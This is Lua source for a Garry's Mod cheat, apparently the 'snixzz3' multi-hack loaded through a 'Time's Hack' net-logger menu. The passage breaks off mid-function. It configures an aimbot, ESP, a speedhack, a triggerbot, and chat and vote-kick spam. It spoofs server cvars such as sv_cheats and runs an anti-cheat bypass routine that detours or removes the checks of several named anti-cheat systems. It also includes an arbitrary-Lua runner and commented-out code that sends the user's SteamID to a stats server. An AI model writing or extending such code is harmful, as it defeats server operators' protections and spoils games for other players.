			countLabel:SetPos( 280, 0 )
			countLabel:SetText("COUNT: " .. count)

			net_message_box = vgui.Create("netmessagebox")
			net_message_box:setTextAndCount(netmsg, count)
			net_message_box:Dock( TOP )
			DScrollPanel:Add(net_message_box)
			DScrollPanel:Dock( FILL )

			self.i = 0
		end
	end,
}

function PANEL:IsOpen(b)
	self.isFrameOpen = b
end

function PANEL:Init()
	self.isFrameOpen = true

	self.W, self.H = self:GetSize()

	outside_self = self
	self:SetSize(400, 400)
	self:SetTitle("Net Logger")
	self:Center()
	self:SetVisible( false )
	self:ShowCloseButton( false )
	--self:SetPaintedManually( true )
	self:SetDeleteOnClose(false)
	self.W, self.H = self:GetSize()

	self.NetLoggerPanel = vgui.Create( "DPanel", self )
	self.NetLoggerPanel:Dock( FILL )
	self.NetLoggerPanel:DockPadding(0, 0, 0, 0)

	self.CategoryList = vgui.Create( "DCategoryList", self.NetLoggerPanel )
	self.CategoryList:Dock( FILL )

	c = 0
	hook.Add( "RecvNetMsg", "netlogger2", function( netmsg )
		c = c + 1
		self:addToCatergory(netmsg, c)
	end )

end

vgui.Register("frame_handler", PANEL, "DFrame")

exploit_menu = vgui.Create("frame_handler")
exploit_menu:MakePopup()


--==================== Injection Welcome Message Thing

print("\n")
MsgC(Color(61, 149, 217), "████████╗██╗███╗░░░███╗███████╗██╗░██████╗  ██╗░░██╗░█████╗░░█████╗░██╗░░██╗\n╚══██╔══╝██║████╗░████║██╔════╝╚█║██╔════╝  ██║░░██║██╔══██╗██╔══██╗██║░██╔╝\n░░░██║░░░██║██╔████╔██║█████╗░░░╚╝╚█████╗░  ███████║███████║██║░░╚═╝█████═╝░\n░░░██║░░░██║██║╚██╔╝██║██╔══╝░░░░░░╚═══██╗  ██╔══██║██╔══██║██║░░██╗██╔═██╗░\n░░░██║░░░██║██║░╚═╝░██║███████╗░░░██████╔╝  ██║░░██║██║░░██║╚█████╔╝██║░╚██╗\n░░░╚═╝░░░╚═╝╚═╝░░░░░╚═╝╚══════╝░░░╚═════╝░  ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\n")

notification.AddLegacy("Successfully Loaded Time's Hack - Welcome " .. LocalPlayer():Nick() .. " | " .. os.date("%I:%M %p"), NOTIFY_HINT, 5)
surface.PlaySound( "buttons/button15.wav" )

end

local DermaButton = vgui.Create( "DButton", panel2 )
DermaButton:SetText( "Snixzz3" )
DermaButton:SetPos( 0, 60 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
	local snixzz = { tCopy = table.Copy }
if _G.snixzz then chat.AddText( Color( 255, 0, 0 ), "\n\n\n\n\nsnixzz3 cannot be reloaded! Reconnect then re-load it." ) return end

local snixzz = {}

snixzz.IsDev = function( ply ) return ply:SteamID64() == "76561198040553376" end -- I am not proud of myself.

if string.find( GetHostName(), "SidewaysGaming.net" ) && !snixzz.IsDev( LocalPlayer() ) then chat.AddText( Color( 255, 0, 0 ), "\n\n\n\n\nsnixzz3 will not load on the developer's servers!" ) return end

snixzz.Panic = false

snixzz.DataFolder = "snixzz3_beta"

snixzz.Info = {
	["Version"] = "",
	["Updated"] = "09/05/18",
	["Size"] = "156kb",
	["Lines"] = "6,461",
}

// Data cache
snixzz.Cache = {}
snixzz.ConsoleHistory = {}
snixzz.ChatCache = {}
snixzz.ChatHistory = {}
snixzz.DisableDetours = false

local G
if _G.easylua then // for why
	G = _G // please no
	snixzz.DisableDetours = true // help me
else
	G = table.Copy( _G )
end
local _R = G.debug.getregistry()
local hookGetTableCopy = G.table.Copy( hook.GetTable() )

local EntM = G.FindMetaTable( "Entity" )
local PlyM = G.FindMetaTable( "Player" )
local WepM = G.FindMetaTable( "Weapon" )
local MatM = G.FindMetaTable( "IMaterial" )

-- Gamemode checks
snixzz.IsTTT = G.GAMEMODE.Name == "Trouble in Terrorist Town"
snixzz.IsDarkRP = ( -- Wow look at all these garbage DarkRP renames.
G.GAMEMODE.Name == "DarkRP" or G.GAMEMODE.Name == "MethRP" or 
G.GAMEMODE.Name == "The Purge" or G.GAMEMODE.Name == "starwarsrp" or 
G.GAMEMODE.Name == "KingdomRP" or G.GAMEMODE.Name == "MilitaryRP" or
G.GAMEMODE.Name == "SlaveRP" or G.GAMEMODE.Name == "1942RP" or
G.GAMEMODE.Name == "ZombieRP" or G.GAMEMODE.Name == "SchoolRP" or
G.GAMEMODE.Name == "PrisonRP" or G.GAMEMODE.Name == "HaloRP" or
G.GAMEMODE.Name == "PonyRP" or G.GAMEMODE.Name == "MexicanBorderRPP" or G.GAMEMODE.Name == "HogwartsRP" -- end my suffering. what the fuck is this shit.
)
snixzz.IsSandbox = G.GAMEMODE.Name == "Sandbox"
snixzz.IsMurder = G.GAMEMODE.Name == "Murder"
snixzz.IsProphunt = G.GAMEMODE.Name == "Prop Hunt" or G.GAMEMODE.Name == "Prophunt"

snixzz.Detours = {
	["net.Start"] = {
		["checksaum"] = true,
		["checksum"] = true,
		["gcontrolled_vars"] = true,
		["controlled_vars"] = true,
		["quack"] = true,
		["leyac_cmd"] = true, -- old but blocks old versions
	},
	["Commands"] = {
		"GetTheTime",
	},
}

snixzz["Spoof"] = {
	["sv_allowcslua"] = 0,
	["sv_cheats"] = 0,
	["host_timescale"] = 1,
	["host_framerate"] = 0,
}	

// Aimbot vars nd shit
snixzz.Target = nil
snixzz.Typing = false
snixzz.Locked = false

snixzz.Bools = {
	
	-- Load settings
	["load_unhooked"] = false,
	
	-- Aimbot & view settings
	["aim_toggle"] = false,
	["aim_autoshoot"] = true,
	["aim_silent"] = true,
	["aim_psilent"] = false,
	["aim_anti"] = false,
	["aim_badshots"] = false,
	["aim_nospread"] = true,
	["aim_norecoil"] = true,
	["aim_prediction"] = true,	
	["aim_antiantiaim"] = false,
	["aim_checkfov"] = false,
	["aim_ignorelos"] = false,
	["aim_ignoresteam"] = true,
	["aim_ignoreadmins"] = false,
	["aim_ignorebots"] = false,
	["aim_ignoreteam"] = false,
	["aim_ignorefriends"] = true,
	["aim_ignoretraitors"] = false,
	["aim_onlytraitors"] = false,
	["aim_holdtarget"] = false,
	["aim_constant_nospread"] = true,
	["aim_smooth"] = false,
	["aim_canfire"] = false,
	
	-- ESP settings
	["esp_enabled"] = true,
	["esp_name"] = true,
	["esp_health_text"] = true,
	["esp_health_bar"] = true,
	["esp_chams"] = true,
	["esp_chams_weapon"] = true,
	["esp_weapon"] = true,
	["esp_box"] = true,
	["esp_crosshair"] = false,
	["esp_crosshair_box"] = false,
	["esp_laser"] = true,
	["esp_nohands"] = true,
	["esp_status"] = true,
	["esp_list"] = true,
	["esp_snaplines"] = false,
	["esp_distance"] = false,
	["esp_dynamiclight"] = false,
	["esp_wireweapon"] = false,
	["esp_aimpos"] = false,
	["esp_bullet_trace"] = false,
	["esp_hitbox"] = false,
	["esp_rainbow"] = false,
	["esp_radar"] = false,

	["misc_bhop"] = true,
	["misc_triggerbot"] = false,
	["misc_thirdperson"] = false,
	["misc_traitor_finder"] = false,
	["misc_murder_finder"] = false,
	["misc_prophunt_finder"] = false,
	["misc_chat_spam"] = false,
	["misc_autostrafe"] = false,
	["misc_rapidfire"] = false,
	["misc_autoreload"] = false, -- todo
	["misc_csnoclip"] = false,
	["misc_exploits_prophunt"] = true,
	["misc_doorspam"] = false,
	["misc_votekickspam"] = false,

}

snixzz.Vars = {
	
	-- Aimbot Vars
	["aim_distance"] = 2147483647,
	["aim_fov"] = 180,
	["aim_offset"] = 0,
	["aim_method"] = "Hitbox",
	["aim_anti_method"] = "Classic",
	["aim_hitbox"] = "Head",
	["aim_bone"] = "Head",
	["aim_target_method"] = "Distance",
	["aim_prediction_method"] = "Engine Velocity",
	["aim_anti_spin_speed"] = 10,
	["aim_target_type"] = "Players",
	["aim_smooth_speed"] = 8,
	
	-- ESP Vars
	["esp_render_distance"] = 3000,
	["esp_chams_material"] = "Solid",
	["esp_box_width"] = 1.5,
	["esp_fov"] = 90,
	["esp_laser_attachment"] = "Iron Sights",
	["esp_type"] = "Players",
	
	-- Misc Vars
	["speedhack_speed"] = 3.5,
	["speedhack_type"] = "pSpeed",
	
	["misc_triggerbot_method"] = "Hitbox",
	["misc_triggerbot_type"] = "Players",
	["misc_menucolor"] = Color( 99, 99, 99, 163 ),
	["misc_menucolor2"] = Color( 0, 221, 225, 145 ),
	["misc_lasercolor"] = Color( 255, 0, 0, 255 ),
	["misc_thirdperson_distance"] = 90,
	["misc_csnoclip_speed"] = 10,

	["misc_chat_spam_method"] = "Advertise",
	["misc_chat_spam_message"] = "Visit www.snixzz.net to download the best Garry's Mod Multi-Hack of 2018", -- TODO: add menu for dis

}

snixzz.Binds = {
	["+aimbot"] = KEY_F,
	["+menu"] = KEY_INSERT,
	["+speedhack"] = KEY_B,
	["+triggerbot"] = KEY_G,
	["chat"] = KEY_T,
}

snixzz.Entities = {}
snixzz.Friends = {}

snixzz.BadEntities = {

	["env_sprite"] = true,
	["player"] = true,
	["prop_physics"] = true,
	["prop_door_rotating"] = true,
	["prop_dynamic"] = true,
	["viewmodel"] = true,
	["weapon_physgun"] = true,
	["weapon_physcannon"] = true,
	["keys"] = true,
	["pocket"] = true,
	["gmod_tool"] = true,
	["physgun_beam"] = true,
	["func_door_rotating"] = true,
	["func_breakable_surf"] = true,
	["worldspawn"] = true,
	["func_door"] = true,
	["class C_Sun"] = true,
	["func_useableladder"] = true,
	["class C_BaseEntity"] = true,
	["class C_PlayerResource"] = true,
	["class C_GMODGameRulesProxy"] = true,
	["class C_WaterLODControl"] = true,
	["class C_ShadowControl"] = true,
	["class C_EnvTonemapController"] = true,
	["class C_PhysPropClientside"] = true,
	["class C_HL2MPRagdoll"] = true,
	["class C_BaseFlex"] = true,
	["class C_ParticleSystem"] = true,
	["class C_RopeKeyframe"] = true,
	["env_skypaint"] = true,
	["manipulate_bone"] = true,
	
}

snixzz.Keys = {
	[1] = { Name = "A", Key = KEY_A },
	[2] = { Name = "B", Key = KEY_B },
	[3] = { Name = "C", Key = KEY_C },
	[4] = { Name = "D", Key = KEY_D },
	[5] = { Name = "E", Key = KEY_E },
	[6] = { Name = "F", Key = KEY_F },
	[7] = { Name = "G", Key = KEY_G },		
	[8] = { Name = "H", Key = KEY_H },
	[9] = { Name = "I", Key = KEY_I },
	[10] = { Name = "J", Key = KEY_J },
	[11] = { Name = "K", Key = KEY_K },
	[12] = { Name = "L", Key = KEY_L },
	[13] = { Name = "M", Key = KEY_M },
	[14] = { Name = "N", Key = KEY_N },
	[15] = { Name = "O", Key = KEY_O },
	[16] = { Name = "P", Key = KEY_P },
	[17] = { Name = "Q", Key = KEY_Q },
	[18] = { Name = "R", Key = KEY_R },
	[19] = { Name = "S", Key = KEY_S },
	[20] = { Name = "T", Key = KEY_T },
	[21] = { Name = "U", Key = KEY_U },
	[22] = { Name = "V", Key = KEY_V },
	[23] = { Name = "W", Key = KEY_W },
	[24] = { Name = "X", Key = KEY_X },
	[25] = { Name = "Y", Key = KEY_Y },
	[26] = { Name = "Z", Key = KEY_Z },
	[27] = { Name = "SPACE", Key = KEY_SPACE },
	[28] = { Name = "TAB", Key = KEY_TAB },
	[29] = { Name = "Left Shift", Key = KEY_LSHIFT },
	[30] = { Name = "Right Shift", Key = KEY_RSHIFT },
	[31] = { Name = "Left Alt", Key = KEY_LALT },
	[32] = { Name = "Right Alt", Key = KEY_RALT },
	[33] = { Name = "Delete", Key = KEY_DELETE },
	[34] = { Name = ".", Key = KEY_PERIOD },
	[35] = { Name = "/", Key = KEY_SLASH },
	[36] = { Name = "[", Key = KEY_LBRACKET },
	[37] = { Name = ";", Key = KEY_SEMICOLON },
	[38] = { Name = "'", Key = KEY_APOSTROPHE },
	[39] = { Name = ",", Key = KEY_COMMA },	
	[40] = { Name = "Insert", Key = KEY_INSERT },
	[41] = { Name = "Middle Mouse", Key = MOUSE_MIDDLE },
	[42] = { Name = "Left Mouse", Key = MOUSE_LEFT },
	[43] = { Name = "Right Mouse", Key = MOUSE_RIGHT },
	[44] = { Name = "Mouse 4", Key = MOUSE_4 },
	[45] = { Name = "Mouse 5", Key = MOUSE_5 },
	[46] = { Name = "Mouse First", Key = MOUSE_FIRST },
	[46] = { Name = "Mouse Last", Key = MOUSE_LAST },
	[46] = { Name = "Mouse Wheel Up", Key = MOUSE_WHEEL_UP },
	[46] = { Name = "Mouse Wheel Down", Key = MOUSE_WHEEL_DOWN },
}

snixzz.DefaultConfig = G.file.Read( snixzz.DataFolder .. "/defaultconfig.txt", "DATA" ) or "default"

// nospread shit
snixzz.RecoilBackup = {}
snixzz.Bullets = {}

snixzz.BadWeapons = {
	["gmod_tool"] = true,
	["gmod_camera"] = true,
	["weapon_physgun"] = true,
	["weapon_crowbar"] = true,
	["keys"] = true,
	["pocket"] = true,
}

snixzz["Colors"] = {
	["White"] = Color( 255, 255, 255, 255 ),
	["Black"] = Color( 0, 0, 0, 255 ),
	["Green"] = Color( 0, 255, 0, 255 ),
	["Red"] = Color( 255, 0, 0, 255 ),
	["DarkRed"] = Color( 200, 50, 50, 255 ),
	["Cyan"] = Color( 0, 255, 255, 255 ),
	["Purple"] = Color( 255, 0, 255 ),
}

snixzz.AdminGroups = {
	["trialmod"] = true,
	["tmod"] = true,
	["trial-mod"] = true,
	["trialmoderator"] = true,
	["t-mod"] = true,
	["mod"] = true,
	["moderator"] = true,
	["operator"] = true,
	["vipmod"] = true,
	["vipmoderator"] = true,
	["admin"] = true,
	["vipadmin"] = true,
	["head-admin"] = true,
	["headadmin"] = true,
	["manager"] = true,
	["developer"] = true,
	["dev"] = true,
	["superadmin"] = true,
	["sadmin"] = true,
	["super"] = true,
	["vipsuperadmin"] = true, -- i cry
	["owner"] = true,
	["root_user"] = true,
	["vipowner"] = true, -- wouldn't be surprised it
	["doubleadmin"] = true, -- what the fuck is this
}

G.surface.CreateFont( "snixzz_status", { font = "coolvetica", size = 20, antialias = true } ) -- HudHintTextLarge
G.surface.CreateFont( "snixzz_logo", { size = 25, weight = 0, antialias = true, shadow = false, font = "Tahoma" } )
G.surface.CreateFont( "snixzz_logo_small", { size = 13, weight = 0, antialias = true, shadow = false, font = "Tahoma" } )
G.surface.CreateFont( "ESPFont", { size = 14, weight = 200, antialias = false, shadow = true, font = "Arial" } )

/* General notification/display functions */

local sound
function snixzz.Sound( Error )

	if Error then
	
		sound = G.Sound( "/HL1/fvox/buzz.wav" )
		
	else
	
		sound = G.Sound( "/buttons/button17.wav" )
		
	end
	
	local createSound = G.CreateSound( G.LocalPlayer(), sound )
	createSound:Play()
	
end

function snixzz.AddToConsole( str )

	if snixzz.ConsoleOpen && snixzz.cHistory && str != nil then
		
		snixzz.cHistory:AddLine( str )
		
		snixzz.cHistory:PerformLayout()
		snixzz.cHistory.VBar:SetScroll( snixzz.cHistory.VBar.CanvasSize )
		
	end
	
	G.table.insert( snixzz.ConsoleHistory, str )
	
end

function snixzz.Message( col, text )

	G.MsgC( snixzz.Colors.Cyan, "[snixzz3]: " )
	G.MsgC( col, text .. "\n" )
	
	snixzz.AddToConsole( text )
	
end

function snixzz.Chat( col, text, bool )
	
	G.chat.AddText(
		
		col, "[snixzz3]: ",
		color_white, text
		
	)
	
	if !bool then
	
		snixzz.AddToConsole( text )
		
	end
	
end

function snixzz.ACNotify( text )

	snixzz.Chat( snixzz.Colors.Red, text )
	
	snixzz.logEvent( "anticheat", text )
	snixzz.Sound( Error )
	
end

function snixzz.Debug( text )

	snixzz.AddToConsole( text )
	
	snixzz.logEvent( "Debug", text )
	
end

function snixzz.LogDetour( text )
	
	snixzz.AddToConsole( text )
	
	snixzz.logEvent( "Detour", text )

end

/* Detour function */
function snixzz.Detour( Old, New )

	snixzz.Detours[New] = Old
	snixzz.AddToConsole( "Detouring function " .. G.tostring( Old ) .. "." )

	return New
end

/* Module Loading */
snixzz.Functions = {}
snixzz.LoadedModules = {}

function snixzz.IsInstalled( mod )
	
	return G.file.Exists( "lua/bin/gmcl_" .. mod .. "_win32.dll", "GAME" )
	
end

-- ghetto module-less loading
function snixzz.LoadModules()

	-- Attempt to load modules
	if G.system.IsWindows() then
	
		--if snixzz.IsInstalled( "bsendpacket" ) then G.require( "bSendPacket" ) snixzz.LoadedModules["bSendPacket"] = true end
		--if snixzz.IsInstalled( "snixzz2" ) then G.require( "snixzz2" ) snixzz.LoadedModules["snixzz2"] = true end
		--G.require( "bSendPacket" )
	end

	-- Check & notify if the module successfully loaded
	/*if bSendPacket != nil or !G.system.IsWindows() then

		bSendPacket = true
		
		snixzz.AddToConsole( "Successfully loaded module 'gmcl_bSendPacket_win32.dll'" )

	else
		
		bSendPacket = nil
		
		snixzz.Chat( snixzz.Colors.Red, "Unable to load module 'gmcl_bSendPacket_win32.dll', disabling module features." )
		
	end*/

	if _G.NHTable != nil or !G.system.IsWindows() then
		
		snixzz.Functions.PredictSpread = _G.NHTable.ZeroSpread
		snixzz.Functions.LocalPlayer = _G.NHTable.SetLPIndex
		snixzz.Functions.ConCommand = _G.NHTable.ClientCMD
		snixzz.Functions.SetViewAngles = _G.NHTable.SetViewAngles
		snixzz.Functions.NoDraw = _G.NHTable.NoDraw
		snixzz.Functions.IsDormant = _G.NHTable.IsDormant
		snixzz.Functions.IsVisible = _G.NHTable.IsVisible
		
		-- C++ IsVisible func
		snixzz.IsVisible = function( v, pos )
	
			/*if snixzz.Bools["aim_antiantiaim"] then
		
				snixzz.FixAngle( v )
	
			end*/
	
			return snixzz.Functions.IsVisible( G.LocalPlayer():GetShootPos(), pos, v:EntIndex() )
		end
		
		snixzz.AddToConsole( "Successfully loaded module 'gmcl_snixzz2_win32.dll'" )
				
		_G.NHTable = nil		
				
	else

		snixzz.Functions.PredictSpread = function( cmd, ang, vec ) return ang end
		snixzz.Functions.LocalPlayer = G.LocalPlayer()
		snixzz.Functions.ConCommand = function( cmd ) G.LocalPlayer():ConCommand( cmd ) end
		snixzz.Functions.NoDraw = function( mat, bool ) end
		snixzz.Functions.SetViewAngles = function( cmd, ang ) cmd:SetViewAngles( ang ) end
		snixzz.Functions.IsDormant = function( index ) return false end
		
		-- Lua IsVisible func
		snixzz.Functions.IsVisible = function( shootpos, pos, v ) return false end
		
		snixzz.IsVisible = function( v, pos )
		
			/*if snixzz.Bools["aim_antiantiaim"] then
		
				snixzz.FixAngle( v )
	
			end*/
			
			local traceTab = { start = G.LocalPlayer():GetShootPos(), endpos = pos, mask = MASK_SHOT, filter = function( entity ) return !entity:IsPlayer() end }
			local trace = G.util.TraceLine( traceTab )
			return !trace.Hit
			
		end
		
		snixzz.Chat( snixzz.Colors.Red, "Unable to load module 'gmcl_snixzz2_win32.dll', disabling module features." )
		
	end

end

/*
	
	VIP/Advertisement System/Stats
	Fuck you, I put a lot of work into this & got like 1 $5 donation, which doesn't even cover 1% of the hosting costs.
	
	This system is constantly being worked on.
	I like tracking stats, there's really no reason for it I just enjoy seeing who's actually using my work.
	
*/

snixzz.Membership = "nil"

function snixzz.Login( ply )

	gui.EnableScreenClicker( true )
	
	snixzz.loadFrame = G.vgui.Create( "DFrame" )
	snixzz.loadFrame:SetTitle( "Logging in as '" .. ply:SteamID64() .. "'" )
	snixzz.loadFrame:SetSize( 250, 50 )
	snixzz.loadFrame:Center()
	snixzz.loadFrame:ShowCloseButton( false )
	snixzz.loadFrame:SetBackgroundBlur( true )
	snixzz.loadFrame:SetDraggable( false )
	
	snixzz.loadFrame.Paint = function( self )
		
		G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 100 ) )
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )
	end
	
	snixzz.loadProgress = G.vgui.Create( "DProgress", snixzz.loadFrame )
	snixzz.loadProgress:SetPos( 5, 22.5 )
	snixzz.loadProgress:SetSize( snixzz.loadFrame:GetWide() - 10, snixzz.loadFrame:GetTall() - 27.5 )
	snixzz.loadProgress:SetFraction( 0.1 )

	local oSystem = "Unknown"
	local oIP = "Unknown"
	
					snixzz.Membership = "vip"
				snixzz.LoadCheat()
			/*
	if system.IsWindows() then oSystem = "Windows" elseif system.IsLinux() then oSystem = "Linux" elseif system.IsOSX() then oSystem = "OSX" else oSystem = "Unknon" end
	
	snixzz.loadProgress:SetFraction( 0.2 )
	
	snixzz.loadFrame:SetTitle( "Connecting to login server" )
		
		function( body )
				
			snixzz.loadFrame:SetTitle( "Connected, getting user info." )
			
			if body == "Error: Banned" then
				
				snixzz.Ban( ply, "ip" )
				
				return
				
			end
				
			local tab = util.JSONToTable( body )

			if istable( tab ) then
			
				if tab.group == "dev" then 
						
					snixzz.Membership = "dev"
					
				elseif tab.group == "vip" then
					
					snixzz.Membership = "vip"

				elseif tab.group == "user" then	
					
					snixzz.Membership = "user"
					
				elseif tab.group == "banned" then
						
					snixzz.Membership = "banned"
					snixzz.Banned = true
					
				elseif body == "Error: Invalid SteamID64" then
						
					snixzz.Chat( Color( 255, 0, 0 ), "There was a problem with your login ID, if you believe this is an error contact 0xymoron @ http://steamcommunity.com/id/sidewaysgamingdotnet/" )
						
					snixzz.Membership = "user" 
					
				else
						
					snixzz.Chat( Color( 255, 0, 0 ), "Failed to fetch user data from login server, running as guest." )
						
					snixzz.Membership = "guest" 

				end
					
				snixzz.loadProgress:SetFraction( 0.3 )	
					
				snixzz.LoadCheat()
				
			elseif string.find( body, "Error: " ) then
				
				snixzz.Chat( Color( 255, 255, 0 ), "\n\n\n\nFailed to load, please see below for reason." )
				snixzz.Chat( Color( 255, 0, 0 ), body )
				
				if snixzz.loadFrame then snixzz.loadFrame:Close() gui.EnableScreenClicker( false ) end
				
				return
					
			else
				
				snixzz.loadFrame:SetTitle( "Received bad login info." )
			
				snixzz.Membership = "guest"
			
				snixzz.Chat( Color( 255, 0, 0 ), "Received bad login response, running as guest." )
				
				snixzz.LoadCheat()
				
			end

					
		end,
		
		function( error )
		
			snixzz.loadFrame:SetTitle( "Failed to connect to login server." )
			
			snixzz.Membership = "guest"
			
			snixzz.LoadCheat( true )
				
		end
		
	)
			*/
	
end

function snixzz.IsVIP()

	return snixzz.Membership == "vip" or snixzz.Membership == "dev"
	--wut?
end

function snixzz.Stats( ply, loading, func )
/*
	G.http.Fetch( "http://snixzz.net/cheats/snixzz3/stats.php?steamid=" .. ply:SteamID64() .. "&load=" .. tostring( loading ),
		
		function( body )
		
			if loading && snixzz.loadProgress then
			
				snixzz.loadProgress:SetFraction( 0.7 )
			
			end
			
			if !string.find( body, "Error:" ) then
		
				G.http.Fetch( "http://snixzz.net/cheats/snixzz3/stats/totalruns.txt", 
					
					function( statsbody )
						
						if loading && snixzz.loadProgress then
			
							snixzz.loadProgress:SetFraction( 0.8 )
							
							func()
							
						end
						
						snixzz.AddToConsole( "Successfully posted stats, snixzz3 has now been ran " .. string.Comma( statsbody ) .. " times." )
						
					end,
					
					function( error ) 
						
						snixzz.Chat( Color( 255, 0, 0 ), "Failed to receive stats." )
						
						if loading && snixzz.loadProgress then
			
							snixzz.loadProgress:SetFraction( 0.8 )
							
							func()
							
						end
						
					end
					
				)
				
			else
				
				snixzz.Chat( Color( 255, 0, 0 ), "Failed to post stats. (" .. body .. ")" )
				
			end
		
		end,
		
		function( error )
			
			snixzz.Chat( Color( 255, 0, 0 ), "Failed to post stats." )
			
		end
		
	)
*/

end

function snixzz.OpenMOTDgdAd( bool )
	/*
	local frame = vgui.Create( "DFrame" )
	frame:SetTitle( "snixzz3 [MOTDgd.com] Advertisement | Consider donating to remove ads." )
	frame:SetSize( ScrW() - 5, ScrH() - 80 ) 
	frame:SetPos( 5, 5 )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )
	
	frame.Paint = function( self )
	
		G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 150 ) )
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )	
	
	end
	
	local html = vgui.Create( "HTML", frame )
	html:SetSize( frame:GetWide() - 5, frame:GetTall() - 60 )
	html:Dock( FILL )
	//html:OpenURL( "-snip-" )
	
	local close = vgui.Create( "DButton" )
	close:SetSize( ScrW() - 10, 60 )
	close:SetPos( 5, ScrH() - 65 )
	close:SetText( "Consider donating ($5 minimum) @ snixzz.net for VIP to remove ads!" )
	close:SetTextColor( color_white )
	close:SetFont( "CloseCaption_Bold" )
	close:SetEnabled( false )
	
	close.Paint = function( self )
		
		G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(),
			self:GetDisabled() == true && Color( 168, 62, 62, 255 ) or self:GetDisabled() == false && Color( 62, 168, 62, 255 )
		)
	
	end
	
	close.DoClick = function( self ) frame:Close() self:Remove() end 
	
	timer.Simple( 20, function()
		
		close:SetEnabled( true )
		close:SetText( "Close" )
		frame:ShowCloseButton( true )
	
		if bool then
			
			snixzz.LoadAllFunctions()
			
		end
	
	end )
	*/
end

snixzz.ACStatus = { -- this is outdated
	["CAC"] = "DETECTED",
	["LeyAC"] = "DETECTED",
	["TAC v4"] = "UNDETECTED",
	["HERP-AC"] = "BYPASSED",
	["TAC v2"] = "BYPASSED",
	["QAC"] = "BYPASSED",
	["VAC"] = "UNDETECTED", -- Shut up, it does exist. it's a tiny blacklist.
	["GAC"] = "UNDETECTED",
	["Kevlar"] = "UNDETECTED",
	["Daz's AC"] = "UNDETECTED",
	["GModZ AC"] = "UNDETECTED",
	["VBAC"] = "UNDETECTED",
	["DivinityRP AC"] = "BYPASSED",
}

/*
	Logging system
*/
snixzz.NoLog = { -- Types of logs to not save in data/
	["Setting"] = true,
	["Load"] = true,
	["Detours"] = true,
	["Config"] = true,
	["Info"] = true,
	["debug"] = true,
	["Timer"] = true,
	["Hook"] = true,
	["Main"] = true,
}

snixzz.Lines = {}
function snixzz.logEvent( Type, str )

	G.table.insert( snixzz.Lines, str )
	if snixzz.LogTab then
		snixzz.LogTab:AddLine( str )
	end
	
	if !snixzz.NoLog[Type] then
		local logFile = "[" .. G.os.date() .. "] " .. str .. "\n"
		G.file.Append( snixzz.DataFolder .. "/logs/" .. Type .. ".txt", logFile )
	end

end

/* Anti-Cheat bypass functions */
-- This is all really outdated. TODO: Update thhis
snixzz.Backup = {}
function snixzz.AntiCheats()

	-- HERP-AC c+p shitty ac
	if _G.CheckVars then
	
		snixzz.ACNoitfy( "function CheckVars exists, detouring the scan." )
		
		_G.CheckVars = snixzz.Detour( _G.CheckVars, function()
		
			snixzz.Chat( Color( 50, 255, 50 ), "HERP-AC attempted to scan cvars, stopping that..." )
			
		end )
		
	end
	
	-- Tyler's Anti-Cheat v2 (shameless bypass of my own anti-cheat)
	if _G.RunCheck then
	
		snixzz.ACNoitfy( "function RunCheck exists, detouring." )
		
		_G.RunCheck = snixzz.Detour( _G.RunCheck, function()
		
			snixzz.Chat( Color( 50, 255, 50 ), "TAC attempted to run a check, returning no information." )
			
		end )
		
 	end

	-- Some shitty PERP anti-cheat
	G.concommand.Remove( "0_u_found" )
	G.concommand.Add( "0_u_found", function()
	
		snixzz.ACNoitfy( "anti-cheat concommand 0_u_found blocked" )
		
	end )
	
	G.hook.Remove( "InitPostEntity", "detrp" )
	
	-- Anti-cheat current detection status
	/*for k, v in G.pairs( snixzz.ACStatus ) do
	
		G.MsgC( Color( 255, 150, 0 ), "[snixzz3]: " )
		G.MsgC( Color( 255, 255, 255 ), k .. ": " )
		
		if v == "DETECTED" then
		
			G.MsgC( Color( 255, 0, 0 ), v .. "\n" )
			
		elseif v == "BYPASSED" then
		
			G.MsgC( Color( 255, 255, 0 ), v .. "\n" )
			
		elseif v == "UNDETECTED" then
		
			G.MsgC( Color( 0, 255, 0 ), v .. "\n" )
			
		end
		
	end*/
	
	G.hook.Remove( "OnGamemodeLoaded", "___scan_g_init" )
	G.hook.GetTable()["OnGamemodeLoaded"]["___scan_g_init"] = function() end
		
end

-- TODO: Add runstring section to menu
local compiledString
function snixzz.RunString( str )

	compiledString = G.CompileString( str, "[C]", false )
	
	if G.type( compiledString ) == "string" then
	
		snixzz.Chat( Color( 0, 255, 255 ), "Failed to run Lua. '" .. str .. "'" )
		
		return
	end

	compiledString()
	
end

local Name
snixzz.Hooks = {}
function snixzz.AddHook( Type, Func )

	Name = G.tostring( Func )
	snixzz.AddToConsole( "Adding unsecure hook '" .. Name .. "'" )
	snixzz.Hooks[Type] = Name
	
	return G.hook.Add( Type, Name, Func )
end

snixzz.TimerCache = {}
function snixzz.RegisterTimer( delay, rep, func )

	Name = G.tostring( func )
	snixzz.AddToConsole( "Adding timer " .. Name .. " with delay '" .. G.tostring( delay ) .. "'" )
	G.table.insert( snixzz.TimerCache, Name )
	
	return G.timer.Create( Name, delay, rep, func )
end

/*

	Settings & Menu backend.
	Config system recycled from hake v2
	Re-wrote a bit of it.
	
*/

function snixzz.CreateOption( dtype, parent, oText, oBool, xPos, yPos, oWide, xPos2, yPos2, oDec, func )

	local addx, addy = 3, 3.5
	
	if dtype == "Checkbox" then
		dtype = "DCheckBoxLabel"
		local text, bool, x, y = oText, oBool, xPos, yPos
		local checkbox = G.vgui.Create( dtype, parent )
		checkbox:SetText( text )
		checkbox:SetPos( x + addx, y + addy )
		checkbox:SizeToContents()
		checkbox:SetTextColor( G.color_white )
		checkbox:SetChecked( snixzz.Bools[bool] ) 
		checkbox.OnChange = function( check ) 
			snixzz.Bools[bool] = checkbox:GetChecked() 
		end 	
		
	elseif dtype == "Slider" then
		dtype = "DNumSlider"
		local text, var, min, max, wide, x, y, Dec = oText, oBool, xPos, yPos, oWide, xPos2, yPos2, oDec
		local slider = G.vgui.Create( dtype, parent )
		slider:SetPos( x + addx, y + addy )
